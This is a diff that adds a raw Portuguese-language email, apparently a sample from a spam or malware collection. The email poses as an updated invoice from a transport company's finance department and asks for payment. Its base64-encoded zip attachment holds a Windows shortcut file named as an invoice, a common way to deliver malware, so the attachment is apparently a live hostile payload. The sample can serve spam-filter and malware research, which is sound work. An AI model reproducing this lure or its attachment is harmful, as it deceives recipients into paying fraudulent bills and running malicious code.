@@ -1,0 +1,79 @@
+Received: from 200.147.34.185 by s602e.ik2.com (IK2 SMTP Server); Thu, 21 Sep 2017 12:21:49 +0000
+Received: from localhost (localhost.localdomain [127.0.0.1])
+	by a2-salada5.whservidor.com (Postfix) with ESMTP id 79E671C05B44;
+	Thu, 21 Sep 2017 09:20:53 -0300 (BRT)
+Received: from a2-salada5.whservidor.com ([127.0.0.1])
+	by localhost (a2-salada5.host.intranet [127.0.0.1]) (UOL-patch-amavisd-new, port 10024)
+	with ESMTP id NyN7kMOdu7zS; Thu, 21 Sep 2017 09:20:53 -0300 (BRT)
+Received: from a1-caju83.servidorwebfacil.com (a1-sardinha2.host.intranet [10.128.129.33])
+	by a2-salada5.whservidor.com (Postfix) with SMTP id 80E3A1C05B4B;
+	Thu, 21 Sep 2017 09:20:19 -0300 (BRT)
+Received: from [191.255.36.197] (port=59575 helo=recepcao-PC)
+	by a1-caju83.servidorwebfacil.com with esmtpa (Exim 4.89)
+	(envelope-from <contato@totesportes.com.br>)
+	id 1dv0So-0004zD-Ie; Thu, 21 Sep 2017 09:20:18 -0300
+From: contato@totesportes.com.br
+Date: 21 Sep 2017 09:20:19 -0300
+Subject: Fatura atualizada 6524 Data: 21/09/2017
+Content-Type: multipart/mixed; boundary=--boundary_1215_c02d3a19-a4c3-4451-932c-b78cd5e77880
+X-SIG5: 0b5f7c362548e7387886a7f7c307616b
+Message-Id: <20170921122053.79E671C05B44@a2-salada5.whservidor.com>
+X-SF-RX-Return-Path: <contato@totesportes.com.br>
+X-SF-HELO-Domain: a2-salada5.whservidor.com
+X-SF-Originating-IP: 200.147.34.185
+X-Rejection-Reason: 12 - 521 The IP 200.147.34.185 is Blacklisted by invaluement.ik2. --- 
+
+
+----boundary_1215_c02d3a19-a4c3-4451-932c-b78cd5e77880
+Content-Type: text/html; charset=us-ascii
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">=0D=0A<HTML><HEAD><meta=
+ http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859-1">=
+=0D=0A<META name=3DGenerator content=3D4.61>=0D=0A<title></title></HEAD>=
+=0D=0A<BODY bgColor=3D#ffffff>=0D=0A<P align=3Dleft><FONT color=3D#313131></FONT>&nbsp;</P>=
+=0D=0A<P align=3Dleft>Bom dia,</P>=0D=0A<P align=3Dleft>Conforme&nbsp;contato=
+ telefonico no dia 19/09/17, segue a fatura =0D=0Aatualizada referente ao=
+ mes de Julho de 2017 </P>=0D=0A<P align=3Dleft>com vencimento para o dia=
+ 25/09/2017. Enviar o comprovante de =0D=0Apagamento assim que possivel.</P>=
+=0D=0A<P align=3Dleft>&nbsp;</P>=0D=0A<P align=3Dleft>&nbsp;</P>=0D=0A<P>Obrigada,</P>=
+=0D=0A<P align=3Dleft><BR>Marcela Souza</P>=0D=0A<P align=3Dleft><FONT size=3D2>Dpto.=
+ Financeiro</FONT></P>=0D=0A<P align=3Dleft><FONT size=3D2>Infinity&nbsp;Express=
+ Transporte e Comercio =0D=0ALTDA.</FONT></P></BODY></HTML>
+----boundary_1215_c02d3a19-a4c3-4451-932c-b78cd5e77880
+Content-Type: application/octet-stream; name=FaturaB41242CLDFAEZEKPPY01AZ33QE.zip
+Content-Transfer-Encoding: base64
+
+UEsDBBQAAAAIABmvNEsFnK9FQAUAACsPAAAQAAAARmF0dXJhQjQxMjQyLmxua+0XXWhbZfR0
+q7NDlMxVmUVdXupAmzRt0i4LKrtN0po1aZPF9CdcwZhcktj8Lb9NEcGHKQg+jInsRVcU9uBg
+MHzYw4pMBMHpnC+Cvg1BJxvWnzfBB893vnvPvTeN25Mg4r18P+ec7/yf7/vujQLAwPAuEM8V
+6mH29lEAJ07Of/CO78HBqwPG+OuhWyUnjvDTHlo4APbnt4FhOBi/sfi181ag6Hj/2yF4yuN5
+9xEYDwZU2Pkchwkax+avjTmcy8VKrtppwNMwBIPwy8fbgZMjgvIkrvh8oJ+6ZShCBXJQhQ40
+EH4YlnSJvvn7X3FAsttoamXvJMCzLPP1EUETMlt7+slMQhdlNUGDMngBWeEAFHSp24FzYw5Y
+jiyEFpdfRVScpZ4bE01IPXrf3S2N06hBHbUVcCzhK/Qc0/W0nvnC5YD2hNsDMG3RIfBCh9JX
+Rxu53YAsMIxS0XJM0nbg2l4n1Kodrd4oaKWSW1vXAPVImT8H9m+JJmSePdVPZo0tbbClbhzX
+sQE8jq2A7VGdU4wunTOPbR+23di+fOzHBxwCiWWgZ1k1cmMg4sLGpLBRFY6rvTaHUa8b1L/t
+7RFWd+Sxd0W/HKgcQ/WOnr+922WTlkQ9XaRruGmeQ3wOXw2pToxGGMcsrhKYHARxVsY3Q7xO
+zIQCM6hTQb4I9i9hUzB2CoTQCoVwCkpUYI6wOVrvofWCskjYNrYg+LFfhYROn4MUycsjvEbw
+GsGCXiLYx/LaBK8SfwfhSYIjLK9rsU/QN4geY3qL6Ans09S3mC7XN9m+LOnrkn9h4hf2VQkW
+/sSIv83+ZYm/RHShP0rrpf9GPGR8FMIGCSv99RM9YYuXCQcJjpO+PMFCfgL1KbjnFJil2RKt
+3+B4Zkn/BtNTnL85zt8M1o7h/wppWevJxyT5U+V4y/h7OD4TtnjKeMl8yXg3WZ6Mxwn2L01W
+2eMxQ1Vmld/mfMr4CXlhost8rRE9xf6UOF4Jkldj+2R+UizPWg8xsiev80t6iLjmKX4xrr9C
+X3sEnLHkL0b5UDgeYY7nBtevGS9pb5Tg53vqocv5SVvyn+ihi0hGLPaY+dhg/zPsr7QnZ8m/
+X7fPKl/G18xvb77N+OysZ3M/mftN2neE/T3O+0XSpf8hmz07zwdzPxyz1EeK/enYYAUWqDfq
+17pfcqS/xvWatsjLcr1kOZ9aTzzTXN8hosfIvizJz/bE24ynl+WlevSZ9SDrLcP1LPMr61va
+swrG+dMC4zxaYf+N+jHjG2F/qpZ4ivUNiqeP9fuYLvMl68FD9XzneKWILut/DXbux6Sl3hLM
+b57v1vo18/0y+2NdL/gTPeeRvC8KNvus9Ww9v4z7xFof4+hFAG/TON6jVeSrYwbKeO/N4hkl
+7ktxU0fwLmzSTVvBvonUMN6yNaRXESfwKq7WbDjjJh7Gz4t7ATZH5edEqF5sa6NqvF7N1zNl
+52yxpDXUSKWp1Sta0xler5Wqda2uFjU5k18W/5Vn1PbNE8I4FTEzGuL/ufj///z7HvGlfY/Y
+Ezh+A/KrHH8YNjsLn4zc3PXCwqWQ++KFxJlLgnYV216kif+OiWQ8eePk2d//WCw4zp/CX7dD
+H333EOLpN+kg2H8O3tIZvn9zZXYr6g9e/nP/6SfOlL86gfhBg2EcxP+UC+83F0xhm6SZD08W
+MZuGw3hye3E2SbQjuMZH3+rTOPNi78Lej+804cV6D0JCnodkWJ8Xgf41Nld0uNKY8nimDvsN
+eqH+WvTypx/GtipvXG99Nv7D+Onb0QPv3dx34TrEl67A0N3oIkt/AVBLAQIUABQAAAAIABmv
+NEsFnK9FQAUAACsPAAAQAAAAAAAAAAAAIAAAAAAAAABGYXR1cmFCNDEyNDIubG5rUEsFBgAA
+AAABAAEAPgAAAG4FAAAAAA==
+----boundary_1215_c02d3a19-a4c3-4451-932c-b78cd5e77880--
+
+
+
+.
